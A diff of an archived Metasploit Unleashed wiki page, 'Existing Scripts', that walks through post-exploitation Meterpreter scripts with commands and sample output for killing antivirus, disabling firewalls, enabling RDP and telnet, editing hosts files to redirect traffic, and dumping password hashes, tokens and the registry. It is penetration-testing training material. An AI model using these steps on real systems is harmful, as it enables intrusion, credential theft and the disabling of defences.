@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Existing Scripts - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Existing_Scripts" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Existing_Scripts&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Existing_Scripts&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Existing_Scripts&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,445 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Existing Scripts</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Existing_Scripts#column-one">navigation</a>, <a href="Existing_Scripts#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Metasploit comes with a ton of useful scripts that can aid you in the Metasploit Framework. These scripts are typically made by third parties and eventually adopted into the subversion repository. We'll run through some of them and walk you through how you can use them in your own penetration test.
+<br />
+<br />
+The scripts mentioned below are intended to be used with a Meterpreter shell after the successful compromise of a target. Once you have gained a session with the target you can utilize these scripts to best suit your needs.
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<table id="toc" class="toc"><tr><td><div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="Existing_Scripts#checkvm"><span class="tocnumber">1</span> <span class="toctext">checkvm</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="Existing_Scripts#getcountermeasure"><span class="tocnumber">2</span> <span class="toctext">getcountermeasure</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="Existing_Scripts#getgui"><span class="tocnumber">3</span> <span class="toctext">getgui</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="Existing_Scripts#get_local_subnets"><span class="tocnumber">4</span> <span class="toctext">get_local_subnets</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="Existing_Scripts#gettelnet"><span class="tocnumber">5</span> <span class="toctext">gettelnet</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="Existing_Scripts#hostsedit"><span class="tocnumber">6</span> <span class="toctext">hostsedit</span></a></li>
+<li class="toclevel-1 tocsection-7"><a href="Existing_Scripts#killav"><span class="tocnumber">7</span> <span class="toctext">killav</span></a></li>
+<li class="toclevel-1 tocsection-8"><a href="Existing_Scripts#remotewinenum"><span class="tocnumber">8</span> <span class="toctext">remotewinenum</span></a></li>
+<li class="toclevel-1 tocsection-9"><a href="Existing_Scripts#scraper"><span class="tocnumber">9</span> <span class="toctext">scraper</span></a></li>
+<li class="toclevel-1 tocsection-10"><a href="Existing_Scripts#winenum"><span class="tocnumber">10</span> <span class="toctext">winenum</span></a></li>
+</ul>
+</td></tr></table>
 <p><br />
+</p>
+<h2> <span class="mw-headline" id="checkvm"> checkvm </span></h2>
+<p>The 'checkvm' script, as its name suggests, checks to see if you exploited a virtual machine. This information can be very useful.
 <br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
 <br />
+<pre> <u>meterpreter</u> > <span style='color:#13C16A;'>run checkvm</span>  
+ 
+ <span style='color:#0000FF;'>[*]</span> Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
+ <span style='color:#0000FF;'>[*]</span> This is a VMware Workstation/Fusion Virtual Machine</pre>
+<br /> 
+</p>
+<h2> <span class="mw-headline" id="getcountermeasure"> getcountermeasure </span></h2>
+<p>The 'getcountermeasure' script checks the security configuration on the victims system and can disable other security measures such as A/V, Firewall, and much more.
+<br />
+<br />
+<pre> <u>meterpreter</u> > <span style='color:#13C16A;'>run getcountermeasure</span> 
+ 
+ <span style='color:#0000FF;'>[*]</span> Running Getcountermeasure on the target... 
+ <span style='color:#0000FF;'>[*]</span> Checking for contermeasures...
+ <span style='color:#0000FF;'>[*]</span> Getting Windows Built in Firewall configuration...
+ <span style='color:#0000FF;'>[*]</span>    
+ <span style='color:#0000FF;'>[*]</span>     Domain profile configuration:
+ <span style='color:#0000FF;'>[*]</span>     -------------------------------------------------------------------
+ <span style='color:#0000FF;'>[*]</span>     Operational mode                  = Disable
+ <span style='color:#0000FF;'>[*]</span>     Exception mode                    = Enable
+ <span style='color:#0000FF;'>[*]</span>    
+ <span style='color:#0000FF;'>[*]</span>     Standard profile configuration:
+ <span style='color:#0000FF;'>[*]</span>     -------------------------------------------------------------------
+ <span style='color:#0000FF;'>[*]</span>     Operational mode                  = Disable
+ <span style='color:#0000FF;'>[*]</span>     Exception mode                    = Enable
+ <span style='color:#0000FF;'>[*]</span>    
+ <span style='color:#0000FF;'>[*]</span>     Local Area Connection 6 firewall configuration:
+ <span style='color:#0000FF;'>[*]</span>     -------------------------------------------------------------------
+ <span style='color:#0000FF;'>[*]</span>     Operational mode                  = Disable
+ <span style='color:#0000FF;'>[*]</span>    
+ <span style='color:#0000FF;'>[*]</span> Checking DEP Support Policy...</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="getgui"> getgui </span></h2>
+<p>The 'getgui' script is used to enable RDP on a target system if it is disabled.
+<br />
+<br />
+<pre> <u>meterpreter</u> > <span style='color:#13C16A;'>run getgui</span> 
+ 
+ Windows Remote Desktop Enabler Meterpreter Script
+ Usage: getgui -u  -p
+
+ 
+ OPTIONS:
+ 
+ -e   Enable RDP only.
+ -h   Help menu.
+ -p   The Password of the user to add.
+ -u   The Username of the user to add.
+ 
+ <u>meterpreter</u> > <span style='color:#13C16A;'>run getgui -e</span>
+ 
+ <span style='color:#0000FF;'>[*]</span> Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+ <span style='color:#0000FF;'>[*]</span> Carlos Perez carlos_perez@darkoperator.com
+ <span style='color:#0000FF;'>[*]</span> Enabling Remote Desktop
+ <span style='color:#0000FF;'>[*]</span> RDP is already enabled
+ <span style='color:#0000FF;'>[*]</span> Setting Terminal Services service startup mode
+ <span style='color:#0000FF;'>[*]</span> Terminal Services service is already set to auto
+ <span style='color:#0000FF;'>[*]</span> Opening port in local firewall if necessary</pre>
+<br /> 
+</p>
+<h2> <span class="mw-headline" id="get_local_subnets"> get_local_subnets </span></h2>
+<p>The 'get_local_subnets' script is used to get the local subnet mask of a victim. This can be very useful information to have for pivoting.
+<br />
+<br />
+<pre> <u>meterpreter</u> > <span style='color:#13C16A;'>run get_local_subnets</span> 
+ 
+ Local subnet: 10.211.55.0/255.255.255.0</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="gettelnet"> gettelnet </span></h2>
+<p>The 'gettelnet' script is used to enable telnet on the victim if it is disabled.
+<br />
+<br />
+<pre> <u>meterpreter</u> > <span style='color:#13C16A;'>run gettelnet</span> 
+ 
+ Windows Telnet Server Enabler Meterpreter Script
+ Usage: gettelnet -u  -p
+
+ 
+ OPTIONS:
+ 
+ -e   Enable Telnet Server only.
+ -h   Help menu.
+ -p   The Password of the user to add.
+ -u   The Username of the user to add.
+ 
+ <u>meterpreter</u> > <span style='color:#13C16A;'>run gettelnet -e</span>
+ 
+ <span style='color:#0000FF;'>[*]</span> Windows Telnet Server Enabler Meterpreter Script
+ <span style='color:#0000FF;'>[*]</span> Setting Telnet Server Services service startup mode
+ <span style='color:#0000FF;'>[*]</span> The Telnet Server Services service is not set to auto, changing it to auto ...
+ <span style='color:#0000FF;'>[*]</span> Opening port in local firewall if necessary</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="hostsedit"> hostsedit </span></h2>
+<p>The 'hostsedit' Meterpreter script is for adding entries to the Windows hosts file. Since Windows will check the hosts file first instead of the configured DNS server, it will assist in diverting traffic to a fake entry or entries. Either a single entry can be provided or a series of entries can be provided with a file containing one entry per line.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run hostsedit</span> 
+ 
+ OPTIONS:
+ 
+ -e   Host entry in the format of IP,Hostname.
+ -h   Help Options.
+ -l   Text file with list of entries in the format of IP,Hostname. One per line.
+ 
+ Example:
+ 
+ run hostsedit -e 127.0.0.1,google.com
+ run hostsedit -l /tmp/fakednsentries.txt
+ 
+ <u>meterpreter</u> > <span style='color:#13C16A;'>run hostsedit -e 10.211.55.162,www.microsoft.com</span>
+ <span style='color:#0000FF;'>[*]</span> Making Backup of the hosts file.
+ <span style='color:#0000FF;'>[*]</span> Backup loacated in C:\WINDOWS\System32\drivers\etc\hosts62497.back
+ <span style='color:#0000FF;'>[*]</span> Adding Record for Host www.microsoft.com with IP 10.211.55.162
+ <span style='color:#0000FF;'>[*]</span> Clearing the DNS Cache</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="killav"> killav </span></h2>
+<p>The 'killav' script can be used to disable most antivirus programs running as a service on a target.
+<br />
+<br />
+<pre> <u>meterpreter</u> > <span style='color:#13C16A;'>run killav</span> 
+ 
+ <span style='color:#0000FF;'>[*]</span> Killing Antivirus services on the target...
+ <span style='color:#0000FF;'>[*]</span> Killing off cmd.exe...</pre>
+<br />
+</p>
+<h2> <span class="mw-headline" id="remotewinenum"> remotewinenum </span></h2>
+<p>The 'remotewinenum' script will enumerate system information through wmic on victim. Make note of where the logs are stored.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run remotewinenum</span>
+ 
+ Remote Windows Enumeration Meterpreter Script
+ This script will enumerate windows hosts in the target environment
+ given a username and password or using the credential under witch
+ Meterpreter is running using WMI wmic windows native tool.
+ Usage:
+ 
+ OPTIONS:
+ 
+ -h   Help menu.
+ -p   Password of user on target system
+ -t   The target address
+ -u   User on the target system (If not provided it will use credential of process)
+ 
+ <u>meterpreter</u> > <span style='color:#13C16A;'>run remotewinenum -u administrator -p ihazpassword -t 10.211.55.128</span>
+ 
+ <span style='color:#0000FF;'>[*]</span> Saving report to /root/.msf3/logs/remotewinenum/10.211.55.128_20090711.0142 
+ <span style='color:#0000FF;'>[*]</span> Running WMIC Commands ....
+ <span style='color:#0000FF;'>[*]</span>     running command wimic environment list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic share list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic nicconfig list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic computersystem list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic useraccount list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic group list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic sysaccount list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic volume list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wimic logicaldisk get description,filesystem,name,size
+ <span style='color:#0000FF;'>[*]</span>     running command wimic netlogin get name,lastlogon,badpasswordcount
+ <span style='color:#0000FF;'>[*]</span>     running command wimic netclient list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wimic netuse get name,username,connectiontype,localname
+ <span style='color:#0000FF;'>[*]</span>     running command wimic share get name,path
+ <span style='color:#0000FF;'>[*]</span>     running command wimic nteventlog get path,filename,writeable
+ <span style='color:#0000FF;'>[*]</span>     running command wimic service list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wimic process list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wimic startup list full
+ <span style='color:#0000FF;'>[*]</span>     running command wimic rdtoggle list
+ <span style='color:#0000FF;'>[*]</span>     running command wimic product get name,version
+ <span style='color:#0000FF;'>[*]</span>     running command wimic qfe list</pre>
+<br /> 
+</p>
+<h2> <span class="mw-headline" id="scraper"> scraper </span></h2>
+<p>The 'scraper' script can grab even more system information, including the entire registry.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run scraper</span>
+ 
+ <span style='color:#0000FF;'>[*]</span> New session on 10.211.55.128:4444...
+ <span style='color:#0000FF;'>[*]</span> Gathering basic system information...
+ <span style='color:#0000FF;'>[*]</span> Dumping password hashes...
+ <span style='color:#0000FF;'>[*]</span> Obtaining the entire registry...
+ <span style='color:#0000FF;'>[*]</span> Exporting HKCU
+ <span style='color:#0000FF;'>[*]</span> Downloading HKCU (C:\WINDOWS\TEMP\LQTEhIqo.reg)
+ <span style='color:#0000FF;'>[*]</span> Cleaning HKCU
+ <span style='color:#0000FF;'>[*]</span> Exporting HKLM
+ <span style='color:#0000FF;'>[*]</span> Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)</pre>
+<br /> 
+From our examples above we can see that there are plenty of Meterpreter scripts for us to enumerate a ton of information, disable anti-virus for us, enable RDP, and much much more.
+<br />
+</p>
+<h2> <span class="mw-headline" id="winenum"> winenum </span></h2>
+<p>The 'winenum' script makes for a very detailed windows enumeration tool. It dumps tokens, hashes and much more.
+<br />
+<br />
+<pre><u>meterpreter</u> > <span style='color:#13C16A;'>run winenum</span> 
+ 
+ <span style='color:#0000FF;'>[*]</span> Running Windows Local Enumerion Meterpreter Script
+ <span style='color:#0000FF;'>[*]</span> New session on 10.211.55.128:4444...
+ <span style='color:#0000FF;'>[*]</span> Saving report to /root/.msf3/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
+ <span style='color:#0000FF;'>[*]</span> Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
+ <span style='color:#0000FF;'>[*]</span>     This is a VMware Workstation/Fusion Virtual Machine 
+ <span style='color:#0000FF;'>[*]</span> Running Command List ...
+ <span style='color:#0000FF;'>[*]</span>     running command cmd.exe /c set
+ <span style='color:#0000FF;'>[*]</span>     running command arp -a
+ <span style='color:#0000FF;'>[*]</span>     running command ipconfig /all
+ <span style='color:#0000FF;'>[*]</span>     running command ipconfig /displaydns
+ <span style='color:#0000FF;'>[*]</span>     running command route print
+ <span style='color:#0000FF;'>[*]</span>     running command net view
+ <span style='color:#0000FF;'>[*]</span>     running command netstat -nao
+ <span style='color:#0000FF;'>[*]</span>     running command netstat -vb
+ <span style='color:#0000FF;'>[*]</span>     running command netstat -ns
+ <span style='color:#0000FF;'>[*]</span>     running command net accounts
+ <span style='color:#0000FF;'>[*]</span>     running command net accounts /domain
+ <span style='color:#0000FF;'>[*]</span>     running command net session
+ <span style='color:#0000FF;'>[*]</span>     running command net share
+ <span style='color:#0000FF;'>[*]</span>     running command net group
+ <span style='color:#0000FF;'>[*]</span>     running command net user
+ <span style='color:#0000FF;'>[*]</span>     running command net localgroup
+ <span style='color:#0000FF;'>[*]</span>     running command net localgroup administrators
+ <span style='color:#0000FF;'>[*]</span>     running command net group administrators
+ <span style='color:#0000FF;'>[*]</span>     running command net view /domain
+ <span style='color:#0000FF;'>[*]</span>     running command netsh firewall show config
+ <span style='color:#0000FF;'>[*]</span>     running command tasklist /svc
+ <span style='color:#0000FF;'>[*]</span>     running command tasklist /m
+ <span style='color:#0000FF;'>[*]</span>     running command gpresult /SCOPE COMPUTER /Z
+ <span style='color:#0000FF;'>[*]</span>     running command gpresult /SCOPE USER /Z
+ <span style='color:#0000FF;'>[*]</span> Running WMIC Commands ....
+ <span style='color:#0000FF;'>[*]</span>     running command wmic computersystem list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wmic useraccount list
+ <span style='color:#0000FF;'>[*]</span>     running command wmic group list
+ <span style='color:#0000FF;'>[*]</span>     running command wmic service list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wmic volume list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wmic logicaldisk get description,filesystem,name,size
+ <span style='color:#0000FF;'>[*]</span>     running command wmic netlogin get name,lastlogon,badpasswordcount
+ <span style='color:#0000FF;'>[*]</span>     running command wmic netclient list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wmic netuse get name,username,connectiontype,localname
+ <span style='color:#0000FF;'>[*]</span>     running command wmic share get name,path
+ <span style='color:#0000FF;'>[*]</span>     running command wmic nteventlog get path,filename,writeable
+ <span style='color:#0000FF;'>[*]</span>     running command wmic process list brief
+ <span style='color:#0000FF;'>[*]</span>     running command wmic startup list full
+ <span style='color:#0000FF;'>[*]</span>     running command wmic rdtoggle list
+ <span style='color:#0000FF;'>[*]</span>     running command wmic product get name,version
+ <span style='color:#0000FF;'>[*]</span>     running command wmic qfe
+ <span style='color:#0000FF;'>[*]</span> Extracting software list from registry
+ <span style='color:#0000FF;'>[*]</span> Finished Extraction of software list from registry
+ <span style='color:#0000FF;'>[*]</span> Dumping password hashes...
+ <span style='color:#0000FF;'>[*]</span> Hashes Dumped
+ <span style='color:#0000FF;'>[*]</span> Getting Tokens...
+ <span style='color:#0000FF;'>[*]</span> All tokens have been processed
+ <span style='color:#0000FF;'>[*]</span> Done!</pre>
+<br />
+<br />
+</p>
+<hr />
+<p><br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Meterpreter_Scripting" title="Meterpreter Scripting">Meterpreter Scripting</a> &gt; Existing Scripts</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><strong class="selflink">Existing Scripts</strong> &#124; <a href="Writing_Meterpreter_Scripts" title="Writing Meterpreter Scripts">Writing Meterpreter Scripts</a> &#124; <a href="Custom_Scripting" title="Custom Scripting">Custom Scripting</a> &#124; <a href="Useful_API_Calls" title="Useful API Calls">Useful API Calls</a> &#124; <a href="Useful_Functions" title="Useful Functions">Useful Functions</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 644/1000000
+Preprocessor generated node count: 2879/1000000
+Post‐expand include size: 3838/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:71-0!*!0!!en!*!* and timestamp 20131123191712 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Existing_Scripts&amp;oldid=1403">http://www.offensive-security.com/w/index.php?title=Existing_Scripts&amp;oldid=1403</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Meterpreter_Scripting&amp;action=edit&amp;redlink=1" class="new" title="Category:Meterpreter Scripting (page does not exist)">Meterpreter Scripting</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +930,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.130 secs. --></body></html>
